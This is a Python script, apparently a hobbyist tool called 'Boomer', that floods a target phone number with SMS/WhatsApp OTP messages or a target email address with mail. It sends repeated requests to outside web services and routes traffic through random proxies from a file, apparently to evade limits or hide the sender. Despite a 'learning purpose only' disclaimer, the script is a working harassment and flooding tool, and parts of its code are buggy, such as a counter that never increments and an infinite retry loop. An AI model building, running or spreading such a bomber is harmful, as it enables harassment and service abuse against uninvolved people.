import subprocess
import time
import os
import sys

"""
Disclaimer:
           This tool is made for learning purpose only.
"""
try:
    import requests
except ImportError:
    print("[*] Installing requests...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

import random

PROXY_FILE = "proxy.txt"


def _load_proxy():
    try:
        with open(PROXY_FILE) as f:
            lines = [l.strip() for l in f if l.strip()]
        if not lines:
            return None
        p = random.choice(lines)
        return p if p.startswith("http") else f"http://{p}"
    except:
        return None


_original_request = requests.sessions.Session.request


def _patched_request(self, method, url, **kwargs):
    if "proxies" not in kwargs:
        proxy = _load_proxy()
        if proxy:
            kwargs["proxies"] = {"http": proxy, "https": proxy}
    return _original_request(self, method, url, **kwargs)


requests.sessions.Session.request = _patched_request
"""
The above code (proxy integration) is from Meta ai. Make sure not to edit this part.

"""
g = "\033[92m"
r = "\033[0m"
b = "\033[34m"
red = "\033[31m"

att = 0


def banner():

    b = r"""
 ____
| __ )  ___   ___  _ __ ___   ___ _ __
|  _ \ / _ \ / _ \| '_ ` _ \ / _ \ '__|
| |_) | (_) | (_) | | | | | |  __/ |
|____/ \___/ \___/|_| |_| |_|\___|_|

                By Errorking404
"""
    print(f"{g}{b}{r}")


def menu():
    print(f"{g}Enter 1 to use SMS & Whatsapp Boomer{r}")
    print(f"{g}Enter 2 to use EMAIL Boomer{r}")
    print(f"{g}Enter 3 to exit{r}")


def smsboom():
    num = input(f"{b}Enter target number. ex(03xxxx):{r}")
    url = f"http://otpguy.vercel.app/?num={num}"
    lim = int(input("Enter limit:"))
    i = 1
    for i in range(1, lim + 1):
        print(f"{g}Launching the Bomber{r}")

        print(f"{b}Bomb Launched{r}")

        while True:
            att = +1
            try:
                resp = requests.get(url, timeout=100)
                resp.raise_for_status()  # throws error if status is 4xx or 5xx
                print(f"{g}{i}, Bomb hit the Target.{r}")
            except requests.exceptions.ConnectionError:
                print(f"No connection. Retrying {att}")
        # data = resp.json()
        # print(data)


def email():
    print(f"{g}")
    mail = input("Enter target mail.e.g:(target@gmail.com):")
    lim = int(input("Enter limit:"))
    print("\033[0m")
    url = f"https://email-bmb.vercel.app/?mail={mail}"
    i = 1
    for i in range(1, lim + 1):
        print(f"{g}Launching Bomber. Please wait{r}")

        print(f"{b}Bomb Launched{r}")
        resp = requests.get(url)
        if resp.status_code == 200:
            print(f"{g}{i}, Bomb hit the target.{r}")
        else:
            print(f"{red}Error. Please contact owner at whatsapp{r}")
            print("{b}+923495025675{r}")


def choice():
    menu()
    choice = int(input("Enter choice:"))
    if choice == 1:
        smsboom()
    elif choice == 2:
        email()
    elif choice == 3:
        sys.exit(1)
    else:
        print("Wrong Choice. Try again")


banner()
choice()
